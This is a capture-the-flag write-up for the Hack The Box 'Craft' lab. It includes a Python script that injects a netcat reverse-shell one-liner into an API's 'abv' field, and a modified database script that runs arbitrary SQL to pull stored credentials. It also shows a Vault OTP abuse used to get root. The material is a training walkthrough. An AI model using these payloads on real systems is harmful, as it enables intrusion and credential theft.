---
title: Hack The Box Craft Write Up
published: true
---
Hey Guys This is chan and Today craft is retired from hack the box and here is my write up about craft.It is an medium linux machine.Craft is an easy one.it is https protoco.So let’s get jump.

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/craft.jpg)

# [](#header-2)Nmap Scan
```
root@ch4n:~# nmap -sC -sV 10.10.10.110

Starting Nmap 7.60 ( https://nmap.org ) at 2019-11-03 15:15 EST
Nmap scan report for 10.10.10.110
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (EdDSA)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# [](#header-3)Web Page
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/webpage.png)

So here if we check the web page there are two interesting things.These are https://api.craft.htb/api/ and https://gogs.craft.htb/

So if we look at https://gogs.craft.htb/ ,there is a git hub repo that’s call Craft/ craft/api and some user accounts 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/craft%20repo.png)

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/craft-api%20repo.png)

So I downloaded the repo with git clone but I got the error like this
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/git%20clone%20error.jpg)

So After some goggling about this error I found the way to fix.You can check it [here](https://supportuae.wordpress.com/2018/07/23/how-to-git-clone-without-ssl-verify/)
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/git%20clone%20error%20fix.jpg)

So we got the file.I used git log -p to find the remove code 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/creds.png)
So here we got the creds.

There is another way to get creds.Here it is.
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/creds2.png)

```
dinesh:4aUh0A8PbVJxgd
```
this line is in test.py so we can  exploit test.py using this creds.If we check test.py ,it is vulnerable to command injections.  

Here is my modiefied code:
```
import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

shell = """__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.37 9001 >/tmp/f")"""

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

print("Create  ABV brew")
brew_dict={}
brew_dict['abv'] = shell
brew_dict['name'] = 'ch4n'
brew_dict['brewer'] = 'ch4n'
brew_dict['style'] = 'ch4n'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
```
after running this file we got reverse shell

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/reverse%20shell.png)

```
/opt/app # ls -la
total 44
drwxr-xr-x    5 root     root          4096 Jan  3 17:28 .
drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
drwxr-xr-x    8 root     root          4096 Feb  8  2019 .git
-rw-r--r--    1 root     root            18 Feb  7  2019 .gitignore
-rw-r--r--    1 root     root          1585 Feb  7  2019 app.py
drwxr-xr-x    5 root     root          4096 Feb  7  2019 craft_api
-rwxr-xr-x    1 root     root           673 Feb  8  2019 dbtest.py
drwxr-xr-x    2 root     root          4096 Feb  7  2019 tests
```

```
/opt/app # cat dbtest.py
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()
/opt/app #
```

after getting reverse shell I check dbtest.py  then modified the script like this
```
#!/usr/bin/env python

import pymysql
from craft_api import settings
import sys
# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
       sql = sys.argv[1]
       cursor.execute(sql)
       results = cursor.fetchall()
       for i in results:
          print(i)

finally:
    connection.close()
```

Then check the tables in database then got user and pass
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/gilfoyle_creds.jpg)
So check Gilfoyle user
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/login.png)

```
gilfoyle : ZEU3N8WNM2rh4T
```

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/gilfoyle%20repo.png)

He has the repo call craft-infra.And also left ssh key

So I copied it to my machine then connect with ssh  then grab the user flag

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/user.jpg)


# [](#header-2)Privillege Escalation

In gilfoyle repo there is a file called secret.sh it it interesting

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/secret.sh.png)

```
#!/bin/bash

# set up vault secrets backend

vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```
It said enable ssh engine then create otp role for root you can read [this](https://www.vaultproject.io/docs/secrets/ssh/index.html)

We have .vault token so that we can login to  the vault then create otp role for root

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/authenticate.png)

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/craft/root.jpg)

In here we are with root.

So that’s it guys hope you enjoy it:-)



